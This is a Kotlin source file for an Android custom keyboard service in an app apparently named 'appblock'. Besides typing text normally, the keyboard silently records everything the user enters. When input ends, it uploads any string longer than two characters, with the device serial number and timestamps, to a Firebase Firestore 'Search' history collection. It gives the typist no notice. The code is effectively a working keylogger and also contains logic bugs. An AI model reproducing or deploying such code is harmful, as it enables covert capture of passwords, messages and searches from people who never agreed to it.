package aldwin.tablante.com.appblock.Service

import aldwin.tablante.com.appblock.R
import android.content.Context
import android.inputmethodservice.InputMethodService
import android.inputmethodservice.KeyboardView
import android.view.View

import android.inputmethodservice.Keyboard
import android.media.AudioManager
import android.view.KeyEvent
import android.view.KeyEvent.KEYCODE_ENTER
import android.view.inputmethod.InputConnection
import android.view.KeyEvent.KEYCODE_ENTER
import android.widget.Toast
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*




class ApplockKeyboard : InputMethodService(),KeyboardView.OnKeyboardActionListener {

    private var kv : KeyboardView? = null
    private var keyboard : Keyboard? = null
    private var ic =currentInputConnection
    private var s = ""
    private var isCaps = false

    override fun swipeRight() {
    }

    override fun onPress(p0: Int) {
    }

    override fun onRelease(p0: Int) {

    }

    override fun swipeLeft() {
    }

    override fun swipeUp() {
    }

    override fun swipeDown() {
    }

    override fun onKey(p0: Int, p1: IntArray?) {
         val ic = currentInputConnection
        playClick(p0)
        when (p0) {
            Keyboard.KEYCODE_DELETE ->{
                ic.deleteSurroundingText(1, 0)
                if(s != null && s.length >0){

                    //s.substring(0,s.length - 1  )
                    s.substring(s.length - 1)
                }
            }

            Keyboard.KEYCODE_SHIFT -> {
                isCaps = !isCaps
                kv!!.isPreviewEnabled = true
                keyboard!!.setShifted(isCaps)
                kv!!.invalidateAllKeys()
            }


            Keyboard.KEYCODE_DONE -> {
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_DOWN, KEYCODE_ENTER))
            onFinishInput()}
            else -> {

                if(p0.toChar() == ' '){

                    s = s + " "
                }
                else{

                    s= s+""+p0.toChar().toString()
                }

                var code = p0.toChar()
                if (Character.isLetter(code) && isCaps)
                code = Character.toUpperCase(code)
                ic.commitText(code.toString(), 1)


            }


        }    }

    override fun onText(p0: CharSequence?) {
    }

    override fun onCreateInputView(): View {
        kv = layoutInflater.inflate(R.layout.keyboard, null) as KeyboardView
        keyboard = Keyboard(this, R.xml.querty)
        kv!!.setKeyboard(keyboard)
        kv!!.setOnKeyboardActionListener(this);

        return kv!!

    }

    override fun onDestroy() {
        super.onDestroy()
    }

    private fun playClick(i: Int) {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        if(i == -4){

            onFinishInput()

        }
        when (i) {


            32 -> am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR)
            Keyboard.KEYCODE_DONE, 10 -> am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN)
            Keyboard.KEYCODE_DELETE -> am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE)

            else -> am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD)

        }

    }

    override fun onFinishInput() {


        if(s.length > 2){
            var device = android.os.Build.SERIAL
            var db = FirebaseFirestore.getInstance()
            var mmap :HashMap<String,Any?> = HashMap()
            mmap.put("SearchInput",s)
            mmap.put("DeviceID",device)
            mmap.put("TimeStamp",getCurrentTime())
            mmap.put("DateStamp",getCurrentDay())
            db.collection("Search").document(device).collection("History").add(mmap)
            mmap.clear()
        }
        s  = ""
        super.onFinishInput()
    }
    fun getCurrentTime():Date{

        val calendar = Calendar.getInstance()
        val mdformat = SimpleDateFormat("HH:mm:ss")
        val strDate =  calendar.time
        return strDate


    }

    fun getCurrentDay():Date{

        val c = Calendar.getInstance().time
        val df = SimpleDateFormat("dd-MMM-yyyy")
       df.format(c)
        return c


    }

}


